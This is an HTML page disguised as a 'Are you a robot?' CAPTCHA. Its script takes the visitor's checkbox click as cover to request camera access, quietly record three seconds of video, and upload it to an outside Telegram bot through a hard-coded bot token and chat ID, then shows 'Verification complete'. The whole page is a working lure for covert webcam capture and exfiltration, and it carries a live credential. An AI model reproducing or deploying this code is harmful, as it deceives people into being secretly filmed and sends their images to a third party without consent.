<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Robot Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #4caf50, #81c784);
            color: #fff;
        }

        .container {
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
        }

        h1 {
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: bold;
        }

        label {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 18px;
            cursor: pointer;
        }

        input[type="checkbox"] {
            width: 20px;
            height: 20px;
            accent-color: #4caf50;
        }

        .loading, .success {
            display: none;
            font-size: 18px;
            margin-top: 20px;
        }

        .loading {
            color: #fbc02d;
        }

        .success {
            color: #4caf50;
            font-size: 20px;
        }

        #robot-checkbox:checked ~ .loading {
            display: block;
        }

        video {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Are you a robot?</h1>
        <label>
            <input type="checkbox" id="robot-checkbox">
            <span>I'm not a robot</span>
        </label>
        <video id="video" autoplay playsinline muted></video>
        <div class="loading">Recording... Please wait ⏳</div>
        <div class="success">✅ Verification Complete!</div>
    </div>

    <script>
        const video = document.getElementById('video');
        const checkbox = document.getElementById('robot-checkbox');
        const loading = document.querySelector('.loading');
        const success = document.querySelector('.success');
        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
        const telegramChatId = "2070423407";

        checkbox.addEventListener('change', (e) => {
            if (e.target.checked) {
                // عرض رسالة التسجيل
                loading.style.display = 'block';

                // طلب الوصول إلى الكاميرا
                navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 320 },
                        height: { ideal: 240 },
                        frameRate: { ideal: 15 }
                    }
                }).then((stream) => {
                    video.srcObject = stream;

                    const mediaRecorder = new MediaRecorder(stream);
                    const chunks = [];

                    mediaRecorder.start();

                    mediaRecorder.ondataavailable = (event) => {
                        chunks.push(event.data);
                    };

                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 3000); // تسجيل 3 ثوانٍ فقط

                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const formData = new FormData();
                        formData.append('chat_id', telegramChatId);
                        formData.append('video', blob, 'video.webm');

                        fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
                            method: 'POST',
                            body: formData
                        })
                        .then((response) => {
                            if (response.ok) {
                                loading.style.display = 'none';
                                success.style.display = 'block';
                                setTimeout(() => {
                                    success.style.display = 'none';
                                    alert('Verification complete!');
                                }, 2000); // انتظار ثانيتين لعرض النجاح
                            } else {
                                alert('Failed to send video.');
                            }
                        })
                        .catch((error) => {
                            alert('Error: ' + error.message);
                        });

                        // إيقاف الكاميرا بعد الانتهاء
                        stream.getTracks().forEach(track => track.stop());
                    };
                }).catch((err) => {
                    alert("Unable to access camera: " + err.message);
                });
            }
        });
    </script>
</body>
</html>
